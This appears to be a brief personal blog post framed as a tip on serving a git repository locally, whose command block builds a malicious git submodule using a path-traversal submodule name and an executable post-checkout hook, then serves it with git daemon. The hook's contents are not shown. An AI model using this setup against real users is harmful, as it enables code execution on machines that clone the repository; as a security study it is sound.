---
title: "Git for Hackers"
date: 2020-06-03T10:00:00
categories:
  - blog
tags:
  - git
  - rough cuts
---


So Git is pretty cool, but what if the internet cuts out (server crash?) and you just want to update your work with a colleague? Well it was amazing to me when I found out that you can quickly locally serve out a git repo!


Below is actually a cut and paste for the creation and local deployment of a malicious Git submodule. The important parts here for the discussion are:
1. Creating the the repo `malicious.git`
2. Creating the alias to make your life easier
3. Running the alias on demand

```bash
$ mkdir malicious.git
$ cd malicious.git
$ git init . --bare
$ cd ../
$ git clone malicious.git
$ cd malicious
$ mkdir -p fakegit/modules/
$ git submodule add https://github.com/pentesterlab/empty.git evil
$ git submodule add https://github.com/pentesterlab/empty.git aaa
$ mv .git/modules/evil fakegit/modules/evil
$ # Make sure your post-checkout script starts with !/bin/sh
$ #vi fakegit/modules/evil/hooks/post-checkout
$ chmod 755 fakegit/modules/evil/hooks/post-checkout
$ git config -f .gitmodules --rename-section submodule.evil submodule.../../fakegit/modules/evil
$ sed -i 's/\.git/fakegit/' evil/.git
$ git add .
$ git commit -m "Initial import"
$ git push
$
$ git config --global alias.quickserve "daemon --verbose --export-all --base-path=malicious.git --reuseaddr --strict-paths malicious.git/"
$ git quickserve
```

